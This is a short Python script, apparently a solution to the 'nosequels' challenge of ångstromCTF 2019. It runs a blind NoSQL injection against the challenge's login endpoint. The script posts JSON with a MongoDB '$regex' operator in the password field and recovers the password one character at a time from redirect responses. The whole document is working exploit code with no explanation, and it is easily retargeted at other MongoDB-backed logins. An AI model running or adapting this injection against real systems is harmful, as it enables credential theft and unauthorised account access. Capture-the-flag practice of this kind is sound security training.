import requests
import string
import json
from time import sleep

strings = string.ascii_letters + string.digits + '{}_'

cookies = requests.get('https://nosequels.2019.chall.actf.co/').cookies.copy()

result = 'pa'

while True:
    for c in strings:
        string = result+c
        j = json.dumps({
            'username': 'normie',
            'password': {'$regex': '^{}'.format(string)}
        })
        print('request: {}'.format(j))
        res = requests.post(
            'https://nosequels.2019.chall.actf.co/login',
            j,
            cookies=cookies,
            headers={'content-type': 'application/json'},
            allow_redirects=False
        )
        if res.status_code == 302:
            result += c
            print(result)
            break
        sleep(0.3)
